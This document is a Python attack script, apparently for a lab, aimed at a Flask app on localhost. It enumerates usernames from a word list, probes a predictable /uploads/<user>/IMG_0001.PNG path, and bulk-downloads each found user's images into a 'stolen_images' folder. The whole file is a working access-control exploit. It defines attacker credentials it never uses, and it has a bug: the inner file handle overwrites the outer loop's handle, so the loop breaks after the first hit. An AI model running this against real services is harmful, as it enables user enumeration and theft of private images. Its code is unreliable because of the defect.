import requests
from bs4 import BeautifulSoup
import os

# --------------------------------------
# Configuration
# --------------------------------------
base_url = "http://127.0.0.1:5000"  # Base URL of the Flask app
login_url = f"{base_url}/login"
home_url = f"{base_url}/"

output_folder = "stolen_images"
os.makedirs(output_folder, exist_ok=True)

root_dir = os.path.dirname(os.path.abspath(__file__))
username_file = os.path.join(root_dir, "names.txt")

# Attacker's valid login credentials (simulates an insider or weak credential reuse)
attacker_creds = {
    "username": "attacker",
    "password": "test123"
}

types = ['IMG']
test = 'IMG_0001'

found = 0
url = ""
count = 0

with open(username_file, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        user = line.strip()

        count = count + 1

        print(user, count)

        test_url = f"{base_url}/uploads/{user}/{test}.PNG"

        try: # Try for just one image to see if username exists

            image = requests.get(test_url)

            if image.status_code == 200:

                print("Username found")

                for i in types:
                    for j in range(1, 21):
                
                        number = f"{j:04}"
                        filename = f'{i}_{number}.PNG'

                        print(filename)

                        url = f"{base_url}/uploads/{user}/{filename}"

                        try: # If username exists redo process for entire set

                            image = requests.get(url)

                            if image.status_code == 200:
                                
                                local_filename = os.path.join(output_folder, f"stolen_{user}_{filename}")

                                with open(local_filename, "wb") as f:
                                    f.write(image.content)

                        except Exception as e:
                            print(f"  [!] Error: {e}")
                        

        except Exception as e:
            print(f"  [!] Error: {e}")



